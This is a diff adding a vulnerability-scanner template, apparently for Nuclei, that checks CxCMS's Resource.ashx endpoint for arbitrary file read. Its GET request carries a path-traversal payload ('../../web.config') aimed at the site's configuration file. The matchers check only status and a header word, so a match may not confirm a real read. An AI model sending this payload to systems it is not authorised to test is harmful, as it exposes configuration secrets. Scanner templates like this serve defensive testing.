@@ -1,0 +1,24 @@
+id: cx-cms-resource-ashx-lfi
+
+info:
+  name: CxCMS Resource.ashx Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    CxCMS Resource.ashx endpoint allows for arbitrary file read when queried with a specially crafted file path parameter.
+  tags: lfi,cxcms
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Sys/Handler/Resource.ashx?_FilePath=../../web.config"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Version"
